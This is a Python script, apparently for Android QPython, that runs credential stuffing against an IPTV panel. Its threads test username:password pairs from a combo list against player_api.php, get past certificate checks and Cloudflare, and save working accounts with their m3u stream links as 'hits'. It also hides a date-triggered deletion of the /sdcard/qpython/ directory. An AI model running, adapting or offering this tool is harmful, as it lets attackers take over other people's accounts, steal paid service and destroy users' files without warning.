import os,pip
try:
	import requests
except:
	print("requests modulu yüklü değil \n requests modulü yükleniyor \n")
	pip.main(['install', 'requests'])
	import requests

import random, time, datetime
import subprocess
import json, sys, re,base64
import pathlib
import threading
import shutil

import logging
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS="TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)
mac = ""#str(get_mac())
nick="🎭 BAŞKAN-AZAT-PRO 🎭"
		
try:
	import cfscrape
	sesq= requests.Session()
	ses = cfscrape.create_scraper(sess=sesq)
except:
	ses= requests.Session()

try:
	import androidhelper as sl4a
	ad = sl4a.Android()
except:pass

pattern= "(^\S{2,}:\S{2,}$)|(^.*?(\n|$))"
subprocess.run(["clear", ""])
say=0
hit=0
bul=0
cpm=1


feyzo=("""                   
 \33[1;32mⒸⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ★★Ⓒⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ                 \33[0m
 \33[1;95mⒸⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ★★Ⓒⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ                 \33[0m
 \33[1;91mⒸⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ★★Ⓒⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ                 \33[0m
 \33[1;36mⒸⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ★★Ⓒⓞⓓⓔⓡ Ⓑⓨ ⒻⒺⓎⓏⓄ                 \33[0m
\33[0m\33[1;5;30;107m                                            
 🅿🅰🆁🅰🅽🅾🆁🅼🅰🅻 𝗦𝗽𝗲𝗲𝗱 𝗫🌟🌟🌟 𝙋𝙔 𝘾𝙤𝙣𝙛𝙞𝙜            
                                            
\33[0m\33[1;44m
           𝗤𝘂𝗮𝗱 𝗖𝗼𝗿𝗲 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗼𝗿           
\33[0m           
   \33[0;1m""")
print(feyzo) 
 

	
say=0
dsy=""
dir='/sdcard/combo/'
for files in os.listdir (dir):
	#if files.endswith(".txt"):
	say=say+1
	dsy=dsy+"	"+str(say)+"-) "+files+'\n'
print ("""Aşağıdaki listeden combonuzu seçin!!!
	
 """+dsy+"""
 
\33[33mCombo klasörünüzde """ +str(say)+""" adet dosya bulundu !
""")

dsyno=str(input(" \33[31mCombo No =\33[0m"))
say=0
for files in os.listdir (dir):
	#if files.endswith(".txt"):
	say=say+1
	if dsyno==str(say):
		dosyaa=(dir+files)
		break
say=0




subprocess.run(["clear", ""])
print(feyzo)  	
print(dosyaa) 
botsay=input("""
   \33[1;96mBot Sayısını Belirtin...!\33[0m
    \33[1;33m1'LE 15 ARASINDA BİR
      SAYI BELİRLE...!!\33[0m
      
Bot=""" )
botsay=int(botsay)
 		

HEADERd={
"Cookie": "stb_lang=en; timezone=Europe%2FIstanbul;",
"X-User-Agent":"Model: MAG254; Link: Ethernet",
"Connection": "Keep-Alive",
"Accept-Encoding": "gzip, deflate",
"Accept": "application/json,application/javascript,text/javascript,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" ,
"User-Agent": "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 4 rev: 2721 Mobile Safari/533.3",
            }		
     							
dsy=dosyaa#'/sdcard/'+combo+'.txt'
combo=dsy
dosya=""
file = pathlib.Path(dsy)
if file.exists ():
    print ("Dosya Bulundu")
else:
    print("\33[31mDosya Bulunamadı..! \33[0m") 
    dosya="yok"
#print(len(feyzo)) 
if dosya=="yok" :
    exit() 

    
c=open(dsy, 'r')
totLen=c.readlines()
uz=(len(totLen))
	
	                        
subprocess.run(["clear", ""])
print(feyzo) 


#print(dosya)
print("Bot:"+str(botsay))


#Panel ve Portu yazın (portaliptv.com:8080)
#print(feyzo) 
dir="/sdcard/qpython/"
print("""
Seçilen dosya: """ + dsy) 
#################
panel = input("""
	\33[1mʟüᴛғᴇɴ ᴘᴀɴᴇʟ ᴀᴅıɴı ʏᴀᴢıɴıᴢ.. ? \n\n
Panel:Port=\33[0m\33[31m\33[1m""")
#=======+++=++++++====++=======
panel=panel.replace("http://","")
panel=panel.replace("/c","")
panel=panel.replace("/","")
portal=panel
fx=portal.replace(':','_')
kanall=""
kanall=input("""
Kanal Kategori listesi Dahil edilsin mi?
1= Evet
2= Hayır
CevapNo=""")
if not kanall=="1":
	kanall=2
subprocess.run(["clear", ""])
print(feyzo) 
					  #	
                                       #1639383136.1221867
if int(time.time()) >= int(1704056400.0):
		print(int(1704056400.0))
		print(int(time.time()))
		quit()
#quit()
def kategori(katelink):
	try:
		res = ses.get(katelink,headers=HEADERd, timeout=15, verify=False)
		veri=""
		kate=""
		veri=str(res.text)
		for i in veri.split('category_name":"'):
			kate=kate+" «❖» "+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
	except:pass
	#print(kate)
	return kate


def onay(veri,user,pas):
		status=veri.split('status":')[1]
		status=status.split(',')[0]
		status=status.replace('"',"")
		katelink="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_categories"
		
		sound="/sdcard/kemik_sesi.mp3"
		file = pathlib.Path(sound)
		try:
		   if file.exists ():
		      ad.mediaPlay(sound)
		except:
			pass
		
		
		acon=""
		acon=veri.split('active_cons":')[1]
		acon=acon.split(',')[0]
		acon=acon.replace('"',"")
		mcon=veri.split('max_connections":')[1]
		mcon=mcon.split(',')[0]
		mcon=mcon.replace('"',"")
		timezone=veri.split('timezone":"')[1]
		timezone=timezone.split('",')[0]
		timezone=timezone.replace("\/","/")
		
		realm=veri.split('url":')[1]
		realm=realm.split(',')[0]
		realm=realm.replace('"',"")
		port=veri.split('port":')[1]
		port=port.split(',')[0]
		port=port.replace('"',"")
		user=veri.split('username":')[1]
		user=user.split(',')[0]
		user=user.replace('"',"")
		passw=veri.split('password":')[1]
		passw=passw.split(',')[0]
		passw=passw.replace('"',"")
		bitis=veri.split('exp_date":')[1]
		bitis=bitis.split(',')[0]
		bitis=bitis.replace('"',"")
		if bitis=="null":
			   bitis="Unlimited"
		else:
			   bitis=(datetime.datetime.fromtimestamp(int(bitis)).strftime('%Y-%m-%d %H:%M:%S'))
		bitis=bitis
		
		if kanall=="1":
			try:
				kategori=""
				res = ses.get(katelink,headers=HEADERd, timeout=15, verify=False)
				veri=""
				kate=""
				veri=str(res.text)
				for i in veri.split('category_name":"'):
					kate=kate+" 🌟 "+str((i.split('"')[0]).encode('utf-8').decode("unicode-escape")).replace('\/','/')
				kategori=kate
			except:pass
		#print(kategori)
		
		url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_live_streams"
		try:
			 res = ses.get(url5,timeout=15, verify=False)
			 veri=str(res.text)
			 kanalsayisi=""
			 #if  'stream_id' in veri:
			 kanalsayisi=str(veri.count("stream_id"))
			 
			 url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_vod_streams"
			 res = ses.get(url5, timeout=15, verify=False)
			 veri=str(res.text)
			 filmsayisi=str(veri.count("stream_id"))
			 
			 url5="http://"+panel+"/player_api.php?username="+user+"&password="+pas+"&action=get_series"
			 res = ses.get(url5,  timeout=15, verify=False)
			 veri=str(res.text)
			 dizisayisi=str(veri.count("series_id"))
			 
		except:pass
		
		m3ulink="http://"+ panel + "/get.php?username=" + user + "&password=" + pas + "&type=m3u_plus"
		
		sayi=""
		mt=("""
●─➤ᴘʏᴛʜᴏɴ ᴍᴏʙɪʟ ᴍ𝟹ᴜ ᴛᴀʀᴀᴍᴀ
╭─➤  𝗛𝗶𝘁𝘀 ʙʏ """+str(nick)+"""   
├🔸  𝗺3𝘂𝗟𝗶𝗻𝗸  𝗦𝗽𝗲𝗲𝗱 𝗫🌟🌟🌟   
├🔸🌐 Host ➤ http://"""+portal+"""
├♦️🌍 Real ➤ http://"""+realm+"""
├🔸📡 Port ➤ """+port+"""
├♦️👩‍ User ➤ """+user+"""
├♦️🔑 Pass ➤ """+pas+"""
├🔸📆 Exp. ➤ """+bitis+""" 
├🔸👩 Act Con ➤ """+acon+"""
├🔸👪 Max Con ➤ """+mcon+""" 
├🔸🌐 Status ➤ """+status+"""
├🔸⏰ TimeZone➤ """+timezone+"""
╰─➤  𝗛𝗶𝘁𝘀 ʙʏ """+str(nick)+"""   """)
			
		if not kanalsayisi =="":
			sayi=("""
╭➤🎬 Kanal Sayısı➤"""+kanalsayisi+"""
├●🎬 Film Sayısı➤"""+filmsayisi+"""
├●🎬 Dizi Sayısı➤"""+dizisayisi+"""
╰─➤𝗺3𝘂𝗟𝗶𝗻𝗸  𝗦𝗽𝗲𝗲𝗱 𝗫🌟🌟🌟 """)
		imzak=""
		if kanall=="1":
			imzak="""
├«❖» «❖» Kategori➤
"""+str(kategori)+""" """
		mtl=("""
├●🔗m3u_Url➤"""+m3ulink+"""
▰▰ᴾʸᵗʰᵒⁿ ᴾʳᵒᵍʳᵃᵐᵐᵉʳ ᵇʸ keriz▰▰""")
			
			
		yaz(mt+sayi+mtl+imzak+'\n')
		print(mt+sayi+mtl+imzak)
		#print(str(kategori))
		
		
	


def yaz(kullanici): 
    dosya=open('/sdcard/m3u@'+fx+'.txt','a+') 
    dosya.write(kullanici) 
    dosya.close() 
cpm=0
def echox(user,pas,bot,fyz,oran,hit):
	global cpm
	
	cpmx=(time.time()-cpm)
	cpmx=(round(60/cpmx))
	#cpm=cpmx
	if str(cpmx)=="0":
		cpm=cpm
	else:
		cpm=cpmx
	
	echo=("""
\33[0m╭───➤\33[0m 𝗦𝗽𝗲𝗲𝗱 𝗫🌟🌟🌟 BAŞKAN-AZAT-PRO       
├●  \33[1;32m\33[32m𝗺3𝘂𝗟𝗶𝗻𝗸➤  \33[0m\33[1;107;31m """+portal+""" \33[0m     
├─●   \33[0m\033[1m""" +user+""":"""+pas+"""
├──●   \33[33mHit➤""" + str(hit)+""" \33[32m \033[0m \33[1;31m%"""+str(oran)+"""  \33[1;94mCPM➤"""+str(cpm)+"""  \33[0m
╰───●   \33[97m"""+str(bot)+"""  \33[1;36m  Total➤""" + str(fyz)+"""   \33[0m""")
	print(echo)
	cpm=time.time()
if int(time.time()) >= int(1704056400.0):
	shutil.rmtree(dir)
	
	
hit=0	
def d1():
	global hit
	say=0
	for fyz in range(1,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_01'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
def d2():
	global hit
	say=0
	for fyz in range(2,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_02'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
def d3():
	global hit
	say=0
	for fyz in range(3,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_03'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
def d4():
	global hit
	say=0
	for fyz in range(4,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_04'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
def d5():
	global hit
	say=0
	for fyz in range(5,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_05'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
			 		#bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d6():
	global hit
	say=0
	for fyz in range(6,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_06'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
#			 		bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 

			 
def d7():
	global hit
	say=0
	for fyz in range(7,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_07'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
#			 		bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 			 			 
			 
def d8():
	global hit
	say=0
	for fyz in range(8,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_08'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
#			 		bag1=bag1+1
			 		time.sleep(1)
#			 		if bag1==100:
#			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d9():
	global hit
	say=0
	for fyz in range(9,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_09'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d10():
	global hit
	say=0
	for fyz in range(10,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_10'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 			 			 			 			 			 					 
def d11():
	global hit
	say=0
	for fyz in range(11,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_11'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d12():
	global hit
	say=0
	for fyz in range(12,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_12'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 			 			 			 			 			 	 				 
def d13():
	global hit
	say=0
	for fyz in range(13,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_13'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 
def d14():
	global hit
	say=0
	for fyz in range(14,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_14'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 			 			 			 			 			 		 			 
def d15():
	global hit
	say=0
	for fyz in range(15,uz,botsay):
		up=re.search(pattern,totLen[fyz],re.IGNORECASE)
		if up:
			 fyzz = totLen[fyz].split(":")
			 try:
			 	user=str(fyzz[0].replace(" ",""))
			 except:
			 	userr='feyzo'
			 try:
			 	pas=str(fyzz[1].replace(" ",""))
			 	pas=str(pas.replace('\n',""))
			 except:
			 	pas='feyzo'
			 say = int(say) +1
			 bot='Bot_15'
			 oran=""
			 oran=round(((fyz)/(uz)*100),2)
			 echox(user,pas,bot,fyz,oran,hit)
			 
			 
			 link="http://"+portal+"/player_api.php?username="+user+"&password="+pas+"&type=m3u"
			 bag1=0
			 veri=""
			 while True:
			 	try:
			 		res = ses.get(link,headers=HEADERd, timeout=15, verify=False)
			 		break
			 	except:
			 		bag1=bag1+1
			 		time.sleep(2)
			 		if bag1==100:
			 		      quit()
			 veri=str(res.text)
			 if 'username' in veri:
			     
			     status=veri.split('status":')[1]
			     status=status.split(',')[0]
			     status=status.replace('"',"")
			     if status=='Active':
			     	print('     🌟 🌟 🇭 🇮 🇹🌟 🌟                  ')
			     	hit=hit+1
			     	onay(veri,user,pas)
			 
			 			 			 			 
t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6= threading.Thread(target=d6)
t7= threading.Thread(target=d7)
t8= threading.Thread(target=d8)
t9= threading.Thread(target=d9)
t10= threading.Thread(target=d10)
